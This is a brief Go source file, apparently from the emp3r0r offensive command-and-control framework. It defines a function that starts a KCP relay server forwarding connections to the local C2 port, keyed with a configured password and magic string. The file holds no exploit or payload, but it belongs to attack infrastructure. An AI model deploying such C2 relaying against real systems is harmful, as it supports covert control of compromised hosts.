package server

import (
	"context"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// KCPC2ListenAndServe KCP server that forwards to C2 port
func KCPC2ListenAndServe(ctx context.Context, cancel context.CancelFunc) {
	logging.Successf("🚀 Starting KCP C2 server at port %s", live.RuntimeConfig.P2PRelayPort)
	transport.KCPTunServer("127.0.0.1:"+live.RuntimeConfig.CCH2Port,
		live.RuntimeConfig.P2PRelayPort, live.RuntimeConfig.Password, def.MagicString, ctx, cancel)
}
